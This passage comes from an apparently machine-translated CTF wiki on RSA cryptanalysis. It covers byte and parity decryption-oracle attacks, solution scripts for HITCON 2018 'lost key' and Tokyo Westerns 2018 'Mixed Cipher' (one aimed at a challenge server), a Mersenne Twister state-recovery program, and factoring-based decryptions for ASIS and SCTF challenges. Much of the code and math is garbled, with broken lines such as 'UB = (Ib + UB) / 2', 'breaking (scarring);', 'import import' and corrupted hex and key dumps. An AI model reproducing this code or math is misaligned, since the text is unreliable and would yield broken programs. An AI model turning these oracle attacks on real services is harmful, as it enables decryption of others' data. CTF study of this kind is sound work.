{h3ll0__17_5_m3_1_w45_w0nd3r1n6_1f_4f73r_4ll_7h353_y34r5_y0u_d_l1k3_70_m337}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#title","title":"Title","text":"<ul> <li> <p>2016 Plaid CTF rabit</p> </li> <li> <p>2016 sharif CTF lsb-oracle-150</p> </li> <li> <p>2018 Backdoor CTF  BIT-LEAKER</p> </li> <li> <p>2018 XMAN trials baby RSA</p> </li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#rsa-byte-oracle","title":"RSA Byte Oracle","text":"<p>Suppose there is currently an Oracle that decrypts a given ciphertext and gives the last byte of the plaintext. Then given an encrypted ciphertext, we only need \\log_{256}n times to know the plaintext message corresponding to this ciphertext.</p>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#principle_1","title":"Principle","text":"<p>This is actually an extension of RSA parity Oracle. Since the last byte can be revealed, then the number of times we get the ciphertext corresponding plaintext should be reduced.</p> <p>Hypothesis</p> <p>P $ C = e ^  N $ way</p> <p>The first time we can send to the server</p> <p>C $ 256 * e ^ = (256P) e ^  N $ way</p> <p>The server will calculate</p> <p>256P $  N $ way</p> <p>Here</p> <ul> <li>256P is an even number.</li> <li>N is an odd number because it is multiplied by two large prime numbers.</li> </ul> <p>Since P is generally less than N, then 256P \\bmod N=256P-kn, k&lt;256. And for two different k_1, k_2, we have</p> <p>256P-k_1n \\not\\equiv 256P-k_2n \\bmod 256</p> <p>We can use the counter-evidence method to prove the above inequality. At the same time, the last byte of 256P-kn is actually -kn obtained in the case of modulo 256. So, in fact, we can first enumerate the last byte in the case of 0~255, construct a mapping table of k and the last byte.</p> <p>When the server returns the last byte b, we can know k according to the mapping table constructed above, that is, subtract k N, that is, kN \\leq 256 P \\leq (k+1)N.</p> <p>After that, we use mathematical induction to obtain the range of P, that is, assume that at the ith time, \\frac{xN}{256^{i}} \\leq P &lt; \\frac{xN+N}{256^{i }}</p> <p>Further, at the i+1th time, we can send</p> <p>C*256^{(i+1)e}</p> <p>The server will calculate</p> <p>$ 256 ^ {i + 1} P  way N = 256 ^ {i + 1} P $ kN</p> <p>0 \\leq 256^{i+1}P-kN&lt;N </p> <p>$  frac {kN} {256} {i + 1}}  leq P &lt; frac {kN + N}</p> <p>According to the result of the ith</p> <p>\\frac{256xN}{256^{i+1}} \\leq P &lt; \\frac{256xN+256N}{256^{i+1}}</p> <p>We can assume k=256y+t here, and the t here is what we can get through the mapping table.</p> <p>\\frac{256yN+tN}{256^{i+1}} \\leq P &lt; \\frac{256yN+(t+1)N}{256^{i+1}}</p> <p>At the same time, since P necessarily exists, the range obtained by the i+1 and the range obtained by the i-th must have an intersection.</p> <p>So y must be equal to x.</p> <p>Further we can summarize this, in the initial case</p> <pre><code>lb = 0\n\nub = N\n</code></pre> <p>Suppose the server returns b, then</p> <pre><code>k = mab [b]\ninterval = (ub-lb)/256\n\nlb = lb + interval * k\n\nub = lb + interval\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#2018-hitcon-lost-key","title":"2018 HITCON lost key","text":"<p>This is a comprehensive topic. First, we don't give n. We can use the method of selecting a plaintext attack to get n. Of course, we can further obtain e. Finally, the code is as follows.</p> <pre><code>from pwn import *\n\nimport gmpy2\n\nfrom fractions import Fraction\n\np = process('./rsa.py')\n\n#p = remote('18.179.251.168', 21700)\n\n#context.log_level = 'debug'\n\np.recvuntil('Here is the flag!\\n')\n\nflagcipher = int(p.recvuntil('\\n', drop=True), 16)\n\n\n\n\n\ndef long_to_hex(n):\n\n    s = hex(n)[2:].rstrip('L')\n\n    if len(s) % 2: s = '0' + s\n\n    return s\n\n\n\n\n\ndef send(ch, num):\n\n    p.sendlineafter('cmd: ', ch)\n\n    p.sendlineafter('input: ', long_to_hex(num))\n\n    data = p.recvuntil('\\n')\n\n    return int(data, 16)\n\n\n\n\n\nif __name__ == \"__main__\":\n\n    # get n\n\n    cipher2 = send('A', 2)\n\n    cipher4 = send('A', 4)\n\n    nset = []\n\n    nset.append(cipher2 * cipher2 - cipher4)\n\n\n\n    cipher3 = send('A', 3)\n\n    cipher9 = send('A', 9)\n\n    nset.append(cipher3 * cipher3 - cipher9)\n\n    cipher5 = send('A', 5)\n\n    cipher25 = send('A', 25)\n\n    nset.append(cipher5 * cipher5 - cipher25)\n\n    n = nset[0]\n\n    for item in nset:\n\n        n = gmpy2.gcd(item, n)\n\n\n\n    # get map between k and return byte\n\n    submap = {}\n\n    for i in range(0, 256):\n\n        submap[-n * i % 256] = i\n\n\n\n    # get cipher256\n\n    cipher256 = send('A', 256)\n\n\n\n    back = flagcipher\n\n\n\n    L = Fraction(0, 1)\n\n    R = Fraction(1, 1)\n\n    for i in range(128):\n\n        print i\n\n        flagcipher = flagcipher * cipher256 % n\n\n        b = send('B', flagcipher)\n\n        k = submap[b]\n\n        L, R = L + (R - L) * Fraction(k, 256\n\n                                     ), L + (R - L) * Fraction(k + 1, 256)\n\n    low = int(L * n)\n\n    print long_to_hex(low - low % 256 + send('B', back)).decode('hex')\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#reference","title":"Reference","text":"<ul> <li> <p>https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack</p> </li> <li> <p>https://pastebin.com/KnEUSMxp</p> </li> </ul>"},{"location":"crypto/asymmetric/rsa/rsa_complex/","title":"RSA Complex topic","text":""},{"location":"crypto/asymmetric/rsa/rsa_complex/#2018-tokyo-western-mixed-cipher","title":"2018 Tokyo Western Mixed Cipher","text":"<p>The information given by the title is as follows:</p> <ul> <li>The length of time each interaction can last is approximately 5 minutes</li> <li>n is a certain 1024 bit in each interaction, but unknown, e is 65537</li> <li>Encrypted flag with aes, neither key nor IV</li> <li>Each time the key is fixed, but the IV will be random each time</li> <li>You can use rsa and aes for encryption with the encrypt function, where each encryption will randomly random es of aes</li> <li>You can use decrypt to decrypt random ciphertext, but only know what the last byte is.</li> <li>You can use the print_flag to get the flag ciphertext</li> <li>sa encrypted aes key can be obtained using print_key</li> </ul> <p>This topic looks like a topic, but in fact it is 3 topics, which need to be solved step by step. Before that, we are ready to interact with the function</p> <pre><code>def get_enc_key(io):\n\n    io.read_until(\"4: get encrypted keyn\")\n\nio.writeline ( &amp;quot;4&amp;quot;)\n    io.read_until(\"here is encrypted key :)n\")\n\nc = int (io.readline () [: - 1], 16)\n    return c\n\n\n\ndef encrypt_io (io, p):\n    io.read_until(\"4: get encrypted keyn\")\n\nio.writeline ( &amp;quot;1&amp;quot;)\n    io.read_until(\"input plain text: \")\n\n    io.writeline(p)\n\n    io.read_until(\"RSA: \")\n\nrsa_c = int (io.readline () [: - 1], 16)\n    io.read_until(\"AES: \")\n\n    aes_c=io.readline()[:-1].decode(\"hex\")\n\n    return rsa_c,aes_c\n\n\n\ndef decrypt_io (io, c):\n    io.read_until(\"4: get encrypted keyn\")\n\nio.writeline ( &amp;quot;2&amp;quot;)\n    io.read_until(\"input hexencoded cipher text: \")\n\n    io.writeline(long_to_bytes(c).encode(\"hex\"))\n\n    io.read_until(\"RSA: \")\n\n    return io.read_line()[:-1].decode(\"hex\")\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#gcd-attack-n","title":"GCD attack n","text":"<p>In the first step, we need to calculate the n that is not given, because we can use the encrypt function to rsa encrypt the plaintext x we input, then we can use the nature of the divisibility to calculate n.</p> <pre><code>Because x ^ e = c mod n\nSo n | x ^ e - c\n</code></pre> <p>We can construct enough x to calculate the most x ^ e - c to calculate the greatest common divisor and get n.</p> <pre><code>def get_n(io):\n\n    rsa_c,aes_c=encrypt_io(io,long_to_bytes(2))\n\n    n=pow(2,65537)-rsa_c\n\n    for i in range(3,6):\n\n        rsa_c, aes_c = encrypt_io(io, long_to_bytes(i))\n\n        n=primefac.gcd(n,pow(i,65537)-rsa_c)\n\n    return n\n</code></pre> <p>Can use encryption to check</p> <pre><code>def check_n (io, n):\nrsa_c, aes_c = encrypt_io (io, &amp;quot;123&amp;quot;)\n    if pow(bytes_to_long(\"123\"), e, n)==rsa_c:\n\n        return True\n\n    else:\n\n        return False\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#rsa-parity-oracle","title":"RSA parity oracle","text":"<p>Using the last byte of leave, we can choose to ciphertext attack, use RSA parity oracle to reply to the key of aes</p> <pre><code>def guess_m(io,n,c):\n\nk = 1\n    lb=0\n\nub = n\n    while ub!=lb:\n\nPrint LB, UB\n        tmp = c * gmpy2.powmod(2, k*e, n) % n\n\n        if ord(decrypt_io(io,tmp)[-1])%2==1:\n\nlb = (lb + ub) / 2\n        else:\n\nUB = (Ib + UB) / 2\nk + = 1\nprint ub, len (long_to_bytes (ub))\n    return ub\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#prng-predict","title":"PRNG Predict","text":"<p>Here we can decrypt the contents of the 16 bytes of the flag, but the first 16 bytes without the IV can not be decrypted. At this point we can find that the random number used by IV generation uses getrandbits, and we can get enough random numbers, then we can make the PRNG prediction, and then get the random number directly.</p> <p>Here I use a ready-made java for Predict of PRNG.</p> <pre><code>public class Main {\n\n\n\n   static int[] state;\n\n   static int currentIndex;\n\n40huo\n   public static void main(String[] args) {\n\n      state = new int[624];\n\n      currentIndex = 0;\n\n\n\n//    initialize(0);\n\n\n\n//    for (int i = 0; i &lt; 5; i++) {\n\n//       System.out.println(state[i]);\n\n//    }\n\n\n\n      // for (int i = 0; i &lt; 5; i++) {\n\n      // System.out.println(nextNumber());\n\n      // }\n\n\n\n      if (args.length != 624) {\n\n         System.err.println(\"must be 624 args\");\n\n         System.exit(1);\n      }\n\n      int[] arr = new int[624];\n\n      for (int i = 0; i &lt; args.length; i++) {\n\n         arr[i] = Integer.parseInt(args[i]);\n\n      }\n\n\n\n\n\nbreaking (scarring);\n\n\n      for (int i = 0; i &lt; 6240huo4; i++) {\n\n         System.out.println(state[i]);\n\n      }\n\n\n\n//    System.out.println(\"currentIndex \" + currentIndex);\n\n//    System.out.println(\"state[currentIndex] \" + state[currentIndex]);\n\n//    System.out.println(\"next \" + nextNumber());\n\n\n\n      // want -2065863258\n\n   }\n\n\n\n   static void nextState() {\n\n      // Iterate through the state\n\n      for (int i = 0; i &lt; 624; i++) {\n\n         // y is the first bit of the current number,\n\n         // and the last 31 bits of the next number\n\n         int y = (state[i] &amp; 0x80000000)\n\n               + (state[(i + 1) % 624] &amp; 0x7fffffff);\n\n         // first bitshift y by 1 to the right\n\n         int next = y &gt;&gt;&gt; 1;\n\n         // xor it with the 397th next number\n\n         next ^= state[(i + 397) % 624];\n\n         // if y is odd, xor with magic number\n\n         if ((y &amp; 1L) == 1L) {\n\n            next ^= 0x9908b0df;\n\n         }\n\n         // now we have the result\n\n         state[i] = next;\n\n      }\n\n   }\n\n\n\n   static int nextNumber() {\n\n      currentIndex++;\n\n      int tmp = state[currentIndex];\n\n      tmp ^= (tmp &gt;&gt;&gt; 11);\n\n      tmp ^= (tmp &lt;&lt; 7) &amp; 0x9d2c5680;\n\n      tmp ^= (tmp &lt;&lt; 15) &amp; 0xefc60000;\n\n      tmp ^= (tmp &gt;&gt;&gt; 18);\n\n      return tmp;\n\n   }\n\n\n\n   static void initialize(int seed) {\n\n\n\n      // http://code.activestate.com/recipes/578056-mersenne-twister/\n\n\n\n      // global MT\n\n      // global bitmask_1\n\n      // MT[0] = seed\n\n      // for i in xrange(1,624):\n\n      // MT[i] = ((1812433253 * MT[i-1]) ^ ((MT[i-1] &gt;&gt; 30) + i)) &amp; bitmask_1\n\n\n\n      // copied Python 2.7's impl (probably uint problems)\n\n      state[0] = seed;\n\n      for (int i = 1; i &lt; 624; i++) {\n\n         state[i] = ((1812433253 * state[i - 1]) ^ ((state[i - 1] &gt;&gt; 30) + i)) &amp; 0xffffffff;\n\n      }\n\n   }\n\n\n\n   static int unBitshiftRightXor(int value, int shift) {\n\n      // we part of the value we are up to (with a width of shift bits)\n\n      int i = 0;\n\n      // we accumulate the result here\n\n      int result = 0;\n\n      // iterate until we've done the full 32 bits\n\n      while (i * shift &lt; 32) {\n\n         // create a mask for this part\n\n         int partMask = (-1 &lt;&lt; (32 - shift)) &gt;&gt;&gt; (shift * i);\n\n         // obtain the part\n\n         int part = value &amp; partMask;\n\n         // unapply the xor from the next part of the integer\n\n         value ^= part &gt;&gt;&gt; shift;\n\n         // add the part to the result\n\n         result |= part;\n\n         i++;\n\n      }\n\n      return result;\n\n   }\n\n\n\n   static int unBitshiftLeftXor(int value, int shift, int mask) {\n\n      // we part of the value we are up to (with a width of shift bits)\n\n      int i = 0;\n\n      // we accumulate the result here\n\n      int result = 0;\n\n      // iterate until we've done the full 32 bits\n\n      while (i * shift &lt; 32) {\n\n         // create a mask for this part\n\n         int partMask = (-1 &gt;&gt;&gt; (32 - shift)) &lt;&lt; (shift * i);\n\n         // obtain the part\n\n         int part = value &amp; partMask;\n\n         // unapply the xor from the next part of the integer\n\n         value ^= (part &lt;&lt; shift) &amp; mask;\n\n         // add the part to the result\n\n         result |= part;\n\n         i++;\n\n      }\n\n      return result;\n\n   }\n\n\n\n   static void rev(int[] nums) {\n\n      for (int i = 0; i &lt; 624; i++) {\n\n\n\n         int value = nums[i];\n\n         value = unBitshiftRightXor(value, 18);\n\n         value = unBitshiftLeftXor(value, 15, 0xefc60000);\n\n         value = unBitshiftLeftXor(value, 7, 0x9d2c5680);\n\n         value = unBitshiftRightXor(value, 11);\n\n\n\n         state[i] = value;\n\n      }\n\n   }\n\n}\n</code></pre> <p>Wrote a python and call java directly</p> <pre><code>from Crypto.Util.number import long_to_bytes,bytes_to_long\n\n\n\n\n\n\ndef encrypt_io (io, p):\n    io.read_until(\"4: get encrypted keyn\")\n\nio.writeline ( &amp;quot;1&amp;quot;)\n    io.read_until(\"input plain text: \")\n\n    io.writeline(p)\n\n    io.read_until(\"RSA: \")\n\nrsa_c = int (io.readline () [: - 1], 16)\n    io.read_until(\"AES: \")\n\n    aes_c=io.readline()[:-1].decode(\"hex\")\n\n    return rsa_c,aes_c\n\nimport subprocess\n\nimport random\n\ndef get_iv(io):\n\nrsa_c, aes_c = encrypt_io (io, &amp;quot;1&amp;quot;)\n    return bytes_to_long(aes_c[0:16])\n\ndef splitInto32(w128):\n\n    w1 = w128 &amp; (2**32-1)\n\n    w2 = (w128 &gt;&gt; 32) &amp; (2**32-1)\n\nw3 = (w128 &amp;gt;&amp;gt; 64) &amp;amp; (2 ** 32-1)\n    w4 = (w128 &gt;&gt; 96)\n\n    return w1,w2,w3,w4\n\ndef sign(iv):\n\n    # converts a 32 bit uint to a 32 bit signed int\n\n    if(iv&amp;0x80000000):\n\n        iv = -0x100000000 + iv\n\n    return iv\n\ndef get_state(io):\n\n    numbers=[]\n\n    for i in range(156):\n\n        print i\n\n        numbers.append(get_iv(io))\n\n    observedNums = [sign(w) for n in numbers for w in splitInto32(n)]\n\n    o = subprocess.check_output([\"java\", \"Main\"] + map(str, observedNums))\n\n    stateList = [int(s) % (2 ** 32) for s in o.split()]\n\n    r = random.Random()\n\n    state = (3, tuple(stateList + [624]), None)\n\n    r.setstate(state)\n\n    return r.getrandbits(128)\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#exp","title":"EXP","text":"<p>The overall attack code is as follows:</p> <pre><code>from zio import *\n\nimport import\nfrom Crypto.Util.number import long_to_bytes,bytes_to_long\n\ntarget=(\"crypto.chal.ctf.westerns.tokyo\",5643)\n\ne = 65537\n\n\ndef get_enc_key(io):\n\n    io.read_until(\"4: get encrypted keyn\")\n\nio.writeline ( &amp;quot;4&amp;quot;)\n    io.read_until(\"here is encrypted key :)n\")\n\nc = int (io.readline () [: - 1], 16)\n    return c\n\n\n\ndef encrypt_io (io, p):\n    io.read_until(\"4: get encrypted keyn\")\n\nio.writeline ( &amp;quot;1&amp;quot;)\n    io.read_until(\"input plain text: \")\n\n    io.writeline(p)\n\n    io.read_until(\"RSA: \")\n\nrsa_c = int (io.readline () [: - 1], 16)\n    io.read_until(\"AES: \")\n\n    aes_c=io.readline()[:-1].decode(\"hex\")\n\n    return rsa_c,aes_c\n\n\n\ndef decrypt_io (io, c):\n    io.read_until(\"4: get encrypted keyn\")\n\nio.writeline ( &amp;quot;2&amp;quot;)\n    io.read_until(\"input hexencoded cipher text: \")\n\n    io.writeline(long_to_bytes(c).encode(\"hex\"))\n\n    io.read_until(\"RSA: \")\n\n    return io.read_line()[:-1].decode(\"hex\")\n\n\n\ndef get_n(io):\n\n    rsa_c,aes_c=encrypt_io(io,long_to_bytes(2))\n\n    n=pow(2,65537)-rsa_c\n\n    for i in range(3,6):\n\n        rsa_c, aes_c = encrypt_io(io, long_to_bytes(i))\n\n        n=primefac.gcd(n,pow(i,65537)-rsa_c)\n\n    return n\n\n\n\ndef check_n (io, n):\nrsa_c, aes_c = encrypt_io (io, &amp;quot;123&amp;quot;)\n    if pow(bytes_to_long(\"123\"), e, n)==rsa_c:\n\n        return True\n\n    else:\n\n        return False\n\n\n\n\n\nimport gmpy2\n\ndef guess_m(io,n,c):\n\nk = 1\n    lb=0\n\nub = n\n    while ub!=lb:\n\nPrint LB, UB\n        tmp = c * gmpy2.powmod(2, k*e, n) % n\n\n        if ord(decrypt_io(io,tmp)[-1])%2==1:\n\nlb = (lb + ub) / 2\n        else:\n\nUB = (Ib + UB) / 2\nk + = 1\nprint ub, len (long_to_bytes (ub))\n    return ub\n\n\n\n\n\nio = zio(target, timeout=10000, print_read=COLORED(NONE, 'red'),print_write=COLORED(NONE, 'green'))\n\nn=get_n(io)\n\nprint check_n (io, n)\nc=get_enc_key(io)\n\nprint len (decrypt_io (io, c)) == 16\n\n\n\n\nm=guess_m(io,n,c)\n\nfor i in range(m - 50000,m+50000):\n\n    if pow(i,e,n)==c:\n\naeskey = i\n        print long_to_bytes(aeskey)[-1]==decrypt_io(io,c)[-1]\n\n        print \"found aes key\",hex(aeskey)\n\n\n\nimport fuck_r\nnext_iv=fuck_r.get_state(io)\n\nprint \"##########################################\"\n\nprint next_iv\n\nprint aeskey\n\nio.interact ()\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2016-asis-find-the-flag","title":"2016 ASIS Find the flag","text":"<p>Here we take the example of Find the flag in the ASIS 2016 online game.</p> <p>The file is extracted and has a ciphertext, a public key, and a py script. Take a look at the public key.</p> <pre><code>\u279c  RSA openssl rsa -pubin -in pubkey.pem -text -modulus\n\nPublic-Key: (256 bit)\n\nModulus:\n\n00: d8: e2: 4c: 12: b7: b9: 9e: fe: 0a: 9b: c0: 4a:\nf5: 8a: 2a: 94: 42: 69: b4: 92: b7: 37: 6d: f1: 29:\n20: 61: b9\nExponent: 12405943493775545863 (0xac2ac3e0ca0f5607)\n\nModulus=D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9\n</code></pre> <p>Such a small N, first break it down.</p> <pre><code>p = 311155972145869391293781528370734636009\n\nq = 315274063651866931016337573625089033553\n</code></pre> <p>Look at the py script again.</p> <pre><code>#!/usr/bin/python\n\nimport gmpy\n\nfrom Crypto.Util.number import *\n\nfrom Crypto.PublicKey import RSA\n\nfrom Crypto.Cipher import PKCS1_v1_5\n\n\n\nflag = open('flag', 'r').read() * 30\n\n\n\ndef ext_rsa_encrypt(p, q, e, msg):\n\n    m = bytes_to_long(msg)\n\n    while True:\n\n        n = p * q\n\n        try:\n\nphi = (p - 1) * (q - 1)\nd = gmpy.invert (e, phi)\n            pubkey = RSA.construct((long(n), long(e)))\n\n            key = PKCS1_v1_5.new(pubkey)\n\n            enc = key.encrypt(msg).encode('base64')\n\n            return enc\n\n        except:\n\n            p = gmpy.next_prime(p**2 + q**2)\n\n            q = gmpy.next_prime(2*p*q)\n\ne = gmpy.next_prime (e ** 2)\n\n\np = getPrime(128)\n\nq = getPrime(128)\n\nn = p*q\n\ne = getPrime(64)\n\npubkey = RSA.construct((long(n), long(e)))\n\nf = open('pubkey.pem', 'w')\n\nf.write(pubkey.exportKey())\n\ng = open('flag.enc', 'w')\n\ng.write(ext_rsa_encrypt(p, q, e, flag))\n</code></pre> <p>The logic is very simple, read the flag and repeat 30 times for the ciphertext. Randomly take p and q, generate a public key, write <code>pubkey.pem</code>, encrypt it with the <code>ext_rsa_encrypt</code> function in the script, and finally write the ciphertext to <code>flag.enc</code>.</p> <p>Try decryption, suggest that the ciphertext is too long, and then look at the encryption function. When the encryption fails, the function will jump to the exception handling and re-take the larger p and q with a certain algorithm until the encryption succeeds.</p> <p>Then we just need to write a corresponding decryption function.</p> <pre><code>#!/usr/bin/python\n\nimport gmpy\n\nfrom Crypto.Util.number import *\n\nfrom Crypto.PublicKey import RSA\n\nfrom Crypto.Cipher import PKCS1_v1_5\n\n\n\ndef ext_rsa_decrypt(p, q, e, msg):\n\n    m = bytes_to_long(msg)\n\n    while True:\n\n        n = p * q\n\n        try:\n\nphi = (p - 1) * (q - 1)\nd = gmpy.invert (e, phi)\n            privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))\n\n            key = PKCS1_v1_5.new(privatekey)\n\nde_error = &amp;#39;&amp;#39;\n            enc = key.decrypt(msg.decode('base64'), de_error)\n\n            return enc\n\n        except Exception as error:\n\n            print error\n\n            p = gmpy.next_prime(p**2 + q**2)\n\n            q = gmpy.next_prime(2*p*q)\n\ne = gmpy.next_prime (e ** 2)\n\n\np = 311155972145869391293781528370734636009\n\nq = 315274063651866931016337573625089033553\n\nn = p*q\n\ne = 12405943493775545863\n# pubkey = RSA.construct((long(n), long(e)))\n\n# f = open('pubkey.pem', 'w')\n\n# f.write(pubkey.exportKey())\n\ng = open('flag.enc', 'r')\n\nmsg = g.read()\n\nflag = ext_rsa_decrypt(p, q, e, msg)\n\nprint flag\n</code></pre> <p>Get the flag</p> <pre><code>ASIS {F4ct0R__N_by_it3rat! Ng!}\n</code></pre>"},{"location":"crypto/asymmetric/rsa/rsa_complex/#sctf-rsa1","title":"SCTF RSA1","text":"<p>Here we take SCTF RSA1 as an example. After decompressing the compressed package, we get the following file.</p> <pre><code>\u279c level0 git: (master) \u2717 ls -al\nTotal dosage 4drwxrwxrwx 1 root root    0 7\u6708  30 16:36 .\n\ndrwxrwxrwx 1 root root    0 7\u6708  30 16:34 ..\n\n-rwxrwxrwx 1 root root  349 5\u6708   2  2016 level1.passwd.enc\n\n-rwxrwxrwx 1 root root 2337 5\u6708   6  2016 level1.zip\n\n-rwxrwxrwx 1 root root  451 5\u6708   2  2016 public.key\n</code></pre> <p>Try to unzip the level1.zip now requires a password. Then according to level1.passwd.enc, we should decrypt the file to get the corresponding password. View public key</p> <pre><code>\u279c  level0 git:(master) \u2717 openssl rsa -pubin -in public.key -text -modulus \n\nPublic-Key: (2048 bit)\n\nModulus:\n\n    00:94:a0:3e:6e:0e:dc:f2:74:10:52:ef:1e:ea:a8:\n\n    89:d6:f9:8d:01:11:51:db:5e:90:92:48:fd:39:0c:\n\n70: 87: 24: D8: 98: 3C: F3: 33: 1c: BA: 5: 61: c2: EC: 2c:\n    5a:f1:5e:65:b2:b2:46:91:56:b6:19:d5:d3:b2:a6:\n\nbb: a3: 7d: 56: 93: 99: 4d: 7e: 4c: 2f: aa: 60: 7b: 3e: c8:\n    fc:90:b2:00:62:4b:53:18:5b:a2:30:10:60:a8:21:\n\nab: 61: 57: d7: e7: cc: 67: 1b: 4d: cd: 66: 4c: 7d: f1: 1a:\n    2a:1d:5e:50:80:c1:5e:45:12:3a:ba:4a:53:64:d8:\n\n(A5: 1: 84: 4a: a: 5c: 55: 02: e8: 8e: 56: 4d: 38: 70: a5:\n16: 36: d3: bc: 14: 3e: 2f: ae: 2f: 31: 58: ba: 00: ab: ac:\n    c0:c5:ba:44:3c:29:70:56:01:6b:57:f5:d7:52:d7:\n\n31: 56: 0b: ab: 0a: e6: 8d: ad: 08: 22: a9: 1f:\ncc: 01: 4c: 12: d2: ab: a3: a5: 97: e5: 10: 49: 19: 7f:\n    d9:3b:c5:53:53:71:00:18:60:cc:69:1a:06:64:3b:\n\n86: 94: 70: a9: yes: 82: fc: 54: 6b: 06: 23: 43:\neb: b6: 1b: 91: 35: 5e: 53: a6: e5: d8: 9a: 84:\nb8: 9f: 63: bc: 70: 06: 2d: 59: d8: 62: a5: fd: 5c: ab: 06:\n    68:81\n\nExponent: 65537 (0x10001)\n\nModulus=94A03E6E0EDCF2741052EF1EEAA889D6F98D011151DB5E909248FD390C708724D8983CF3331CBAC561C2CE2C5AF15E65B2B2469156B619D5D3B2A6BBA37D5693994D7E4C2FAA607B3EC8FC90B200624B53185BA2301060A821AB6157D7E7CC671B4DCD664C7DF11A2A1D5E5080C15E45123ABA4A5364D8721F844AAE5C5502E88E564D3870A51636D3BC143E2FAE2F3158BA00ABACC0C5BA443C297056016B57F5D752D731560BAB0AE68DAD0822A91FCB6E49CC014C12D2ABA3A597E51049197F69D93BC5535371001860CC691A06643B869470A9DA82FC546B0623432DB020EBB61B91355E53A6E5D89A84BB3046B89F63BC70062D59D862A5FD5CAB066881\n\nwriting RSA key\n\n-----BEGIN PUBLIC KEY-----\n\nMIIBIjANBgkqkkiG9w0BAQEFAAOCAQ8AMIIBCgKCQQll + bg7c8nQQUu8e6qiJ\n1vmNARFR216Qkkj9OQxwhyTYmDzzMxy6xWHCzixa8V5lsrJGkVa2GdXTsqa7o31W\n\nk5lNfkwvqmB7Psj8kLIAYktTGFuiMBBgqCGrYVfX58xnG03NZkx98RoqHV5QgMFe\n\nRRI6ukpTZNhyH4RKrlxVAuiOVk04cKUWNtO8FD4vri8xWLoAq6zAxbpEPClwVgFr\n\nV / XXUtcxVgurCuaNrQgiqR / LbknMAUwS0qujpZflEEkZf2nZO8VTU3EAGGDMaRoG\nZDuGlHCp2oL8VGsGI0MtsCDrthuRNV5TpuXYmoS7MEa4n2O8cAYtWdhipf1cqwZo\n\nDOWNLOAD\n-----END PUBLIC KEY-----\n</code></pre> <p>It is found that although it is 2048 bits, it is obvious that the modulus is not so long. Try to decompose and get</p> <pre><code>p=250527704258269\n\nq=74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349\n</code></pre> <p>Then you can construct and decrypt, the code is as follows</p> <pre><code>from Crypto.PublicKey import RSA\n\nimport gmpy2\n\nfrom base64 import b64decode\n\np = 250527704258269\n\nq = 74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349\n\ne = 65537\nn = p * q\n\n\n\n\n\ndef getprivatekey(n, e, p, q):\n\nPhin = (p - 1) * (q - 1)\nd = gmpy2.invert (e, phin)\n    priviatekey = RSA.construct((long(n), long(e), long(d)))\n\n    with open('private.pem', 'w') as f:\n\n        f.write(priviatekey.exportKey())\n\n\n\n\n\ndef decrypt():\n\n    with open('./level1.passwd.enc') as f:\n\n        cipher = f.read()\n\n    cipher = b64decode(cipher)\n\n    with open('./private.pem') as f:\n\n        key = RSA.importKey(f)\n\n    print key.decrypt(cipher)\n\n\n\n\n\n#getprivatekey(n, e, p, q)\n\ndecrypt()\n</code></pre> <p>Found wrong</p> <pre><code>\u279c  level0 git:(master) \u2717 python exp.py\n\nA bunch of garbled. .\n</code></pre> <p>At this time, we must consider other situations. Generally speaking, the RSA implemented in reality will not directly use the original RSA, and will add some padding such as OAEP. Let's try and modify the code here.</p> <pre><code>def decrypt1():\n\n    with open('./level1.passwd.enc') as f:\n\n        cipher = f.read()\n\n    cipher = b64decode(cipher)\n\n    with open('./private.pem') as f:\n\n        key = RSA.importKey(f)\n\n        key = PKCS1_OAEP.new(key)\n\n    print key.decrypt(cipher)\n</code></pre> <p>Sure enough, get</p> <pre><code>\u279c  level0 git:(master) \u2717 python exp.py\n\nFaC5ori1ati0n_aTTA3k_p_tOO_sma11\n</code></pre> <p>Get the decompression password. Go ahead and look at the public key in level1</p> <pre><code>\u279c  level1 git:(master) \u2717 openssl rsa -pubin -in public.key -text -modulus\n\nPublic-Key: (2048 bit)\n\nModulus:\n\n00: c3: 26: 59: 69: e1: ed: 74: d2: e0: b4: 9a: d5: 6a:\n2f: 2a: 9e: c3: 71: ff: 13: 4b: 10: 37: c0: 6f: 56: 19: 34:\nc5: cb: 1f: 6d: c0: e3: 57: 3b: 47: c4:\n    11:11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4:\n\n    f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e:\n\n4b: 01: 53: 4a: 67: cb: 22: 23: 3b: 34: 2e: af: 13: ef: 93:45: 16: 2b: 00: 9f: e0: 4b: d1: 90: c9: 2c:\n3f: d7: ee: 40: f5: aa: 8c: e9: c2: 7b: f4: 36:\ne3: 38: 9d: 04: 50: db: a9: b7: 3f: 4b: 2a: d6:\n87: 2a: eb: 74: 35: 98: 6a: 9c: e4: 52: cb: 93: 78:\n    39:83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc:\n\n41: 64: 5e: 06: yes: 83: d0: 3b: 06: 42: 70:\n    